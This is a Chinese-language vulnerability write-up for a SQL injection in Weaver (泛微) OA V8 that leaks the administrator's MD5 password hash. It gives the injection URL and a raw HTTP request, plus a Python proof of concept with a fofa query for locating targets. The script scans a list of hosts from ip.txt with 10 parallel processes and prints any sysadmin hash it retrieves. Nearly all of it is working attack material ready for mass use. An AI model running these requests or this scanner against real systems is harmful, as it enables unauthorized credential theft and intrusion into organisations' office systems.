### 描述
可以通过漏洞获取到系统管理员加密的（MD5）的密码值



### 利用(payload)
```
/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

### 利用（数据包）
```
GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://IP/login/Login.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=abcKPQwz8VeaP9hDLT5Ix; testBanCookie=test
Connection: close
```
![WechatIMG191.jpg](https://i.loli.net/2021/04/12/KsWYxvEqlAG2OXp.jpg)


### POC
```
# 泛微OA V8 SQL注入获取管理员(sysadmin)MD5后的密码信息
# fofa:  app="泛微-协同办公OA"

import requests
import urllib3
from  multiprocessing import Pool
urllib3.disable_warnings()

def title():
    print("[-------------------------------------------------]")
    print("[------------    泛微OA V8 SQL注入     ------------]")
    print("[--------    use:python3 weaverSQL.py     --------]")
    print("[------------     Author:Henry4E36    ------------]")
    print("[-------------------------------------------------]")


def target_url(url):
    target_url = url + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    # 代理设置
    # proxy = "127.0.0.1:8080"
    # proxies = {
    #     'http': 'http://' + proxy,
    #     'https': 'https://' + proxy
    # }
    try:
        res = requests.get(url=target_url,headers=headers,verify=False,timeout=10)
        if res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在SQL注入！\033[0m")
            print("[-]  正在查询sysadmin密码信息.......")
            print(f"[-]  用户: sysadmin    密码MD5: \033[33m{res.text.strip()}\033[0m")
            print("[---------------------------------------------------------------------]")
        else:
            print(f"[0]  目标系统: {url} 不存在SQL注入！\033[0m")
            print("[---------------------------------------------------------------------]")
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n",e)
        print("[---------------------------------------------------------------------]")


if __name__ == "__main__":
    title()
    pool = Pool(processes=10)
    with open("ip.txt","r") as f:
        for url in f:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip()
            pool.apply_async(target_url, args=(url,))
    f.close()
    pool.close()
    pool.join()
```
